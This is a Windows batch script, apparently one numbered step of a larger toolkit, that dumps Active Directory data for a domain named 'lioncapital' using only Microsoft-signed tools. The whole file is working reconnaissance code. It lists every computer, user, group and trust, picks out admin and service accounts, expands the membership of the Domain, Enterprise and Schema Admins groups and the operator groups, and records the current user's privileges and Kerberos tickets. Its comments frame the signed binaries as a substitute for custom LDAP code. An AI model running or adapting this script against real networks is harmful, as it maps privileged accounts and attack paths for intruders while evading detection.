@echo off
setlocal enabledelayedexpansion
REM ============================================
REM  3_AD_Dump.bat - Full Active Directory dump via signed binaries
REM  ALL SIGNED MS BINARIES: dsquery.exe  dsget.exe  net.exe  nltest.exe  whoami.exe  klist.exe  findstr.exe  type
REM  Replaces custom C# LDAP with Microsoft-signed binaries.
REM  Output: %TEMP%\ad_*.log
REM ============================================

set "OUT=%TEMP%"
set "DOM=lioncapital"

echo.
echo === COMPUTERS IN DOMAIN ===
dsquery.exe computer "DC=%DOM%,DC=local" -limit 0 > "%OUT%\ad_computers.log" 2>&1
echo --- count ---
find /c /v "" < "%OUT%\ad_computers.log"

echo.
echo === USERS IN DOMAIN ===
dsquery.exe user "DC=%DOM%,DC=local" -limit 0 > "%OUT%\ad_users.log" 2>&1
echo --- count ---
find /c /v "" < "%OUT%\ad_users.log"

echo.
echo --- Privileged users (admin/svc/sa/service/backup/iops) ---
findstr /i "admin svc sa service backup iops helpdesk" "%OUT%\ad_users.log" > "%OUT%\ad_priv_users.log" 2>&1
type "%OUT%\ad_priv_users.log"

echo.
echo === GROUPS IN DOMAIN ===
dsquery.exe group "DC=%DOM%,DC=local" -limit 0 > "%OUT%\ad_groups.log" 2>&1
echo --- count ---
find /c /v "" < "%OUT%\ad_groups.log"

echo.
echo --- Admin-tier groups ---
findstr /i "admin" "%OUT%\ad_groups.log" > "%OUT%\ad_admin_groups.log" 2>&1
type "%OUT%\ad_admin_groups.log"

echo.
echo === ORGANIZATIONAL UNITS ===
dsquery.exe ou "DC=%DOM%,DC=local" -limit 0 > "%OUT%\ad_ous.log" 2>&1
type "%OUT%\ad_ous.log"

echo.
echo === DOMAIN CONTROLLERS ===
nltest.exe /dclist:%DOM%.local > "%OUT%\ad_dcs.log" 2>&1
type "%OUT%\ad_dcs.log"

echo.
echo === SITE INFO ===
nltest.exe /dsgetsite > "%OUT%\ad_site.log" 2>&1
nltest.exe /dsgetdc:%DOM%.local > "%OUT%\ad_dc_info.log" 2>&1

echo.
echo === DOMAIN TRUSTS ===
nltest.exe /domain_trusts > "%OUT%\ad_trusts.log" 2>&1
type "%OUT%\ad_trusts.log"

echo.
echo === FOREST INFO ===
nltest.exe /testtrust /domain:%DOM%.local > "%OUT%\ad_trust_test.log" 2>&1

echo.
echo === LOCAL MACHINE TRUSTS ===
nltest.exe /sc_query > "%OUT%\ad_sc_query.log" 2>&1

echo.
echo === WHOAMI / ALL (own identity + privileges) ===
whoami.exe /all > "%OUT%\ad_whoami.log" 2>&1
type "%OUT%\ad_whoami.log"

echo.
echo === KERBEROS TICKETS (own session) ===
klist.exe > "%OUT%\ad_tickets.log" 2>&1
type "%OUT%\ad_tickets.log"

echo.
echo === LOCAL ADMINS / DOMAIN LOGINS ===
net.exe localgroup Administrators > "%OUT%\ad_local_admins.log" 2>&1
type "%OUT%\ad_local_admins.log"
net.exe localgroup "Domain Admins" > "%OUT%\ad_local_da.log" 2>&1
type "%OUT%\ad_local_da.log"

echo.
echo === KEY DOMAIN GROUPS - MEMBERS ===
echo --- Domain Admins ---
dsquery.exe group -samid "Domain Admins" | dsget.exe group -members -expand > "%OUT%\ad_da_members.log" 2>&1
type "%OUT%\ad_da_members.log"

echo.
echo --- Enterprise Admins ---
dsquery.exe group -samid "Enterprise Admins" | dsget.exe group -members -expand > "%OUT%\ad_ea_members.log" 2>&1
type "%OUT%\ad_ea_members.log"

echo.
echo --- Schema Admins ---
dsquery.exe group -samid "Schema Admins" | dsget.exe group -members -expand > "%OUT%\ad_schema_members.log" 2>&1
type "%OUT%\ad_schema_members.log"

echo.
echo --- Account Operators ---
dsquery.exe group -samid "Account Operators" | dsget.exe group -members -expand > "%OUT%\ad_acctops_members.log" 2>&1
type "%OUT%\ad_acctops_members.log"

echo.
echo --- Backup Operators ---
dsquery.exe group -samid "Backup Operators" | dsget.exe group -members -expand > "%OUT%\ad_backup_members.log" 2>&1
type "%OUT%\ad_backup_members.log"

echo.
echo --- Server Operators ---
dsquery.exe group -samid "Server Operators" | dsget.exe group -members -expand > "%OUT%\ad_srvops_members.log" 2>&1
type "%OUT%\ad_srvops_members.log"

echo.
echo === Done. Files in %OUT% ===
dir "%OUT%\ad_*"
pause
endlocal
